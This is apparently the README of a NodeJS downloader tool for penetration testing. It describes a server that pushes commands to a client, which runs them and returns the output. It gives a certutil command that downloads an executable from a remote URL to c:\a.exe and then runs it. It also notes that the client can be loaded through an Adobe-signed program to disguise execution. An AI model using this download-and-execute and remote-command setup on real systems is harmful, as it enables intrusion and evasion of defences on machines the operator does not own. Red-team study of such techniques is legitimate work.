# Nodejs-Downloader
An example of a downloader written in NodeJS.

Usage:

1. Download the NodeJS:

https://nodejs.org/en/download/

You just need node.exe in the file.

2. Set the command sent to the client:

Edit the Server.js

eg.

var command = 'certutil -urlcache -split -f https://github.com/3gstudent/test/raw/master/putty.exe c:\\a.exe&&c:\\a.exe';

3. Start the server

node.exe Server.js

When you use a browser to access it, you will return 404.

4. Start the client

node.exe Client.js

It will connect to the server and get the command, then execute the command and send the result again.

Client.js can be loaded by a program with a digital signature of Adobe Systems Incorporated.

![Alt text](https://raw.githubusercontent.com/3gstudent/NodeJS-Downloader/blob/master/1.png)

Reference:

https://bbs.pediy.com/thread-249573.htm


More details:

《渗透测试中的Node.js》[Coming soon]
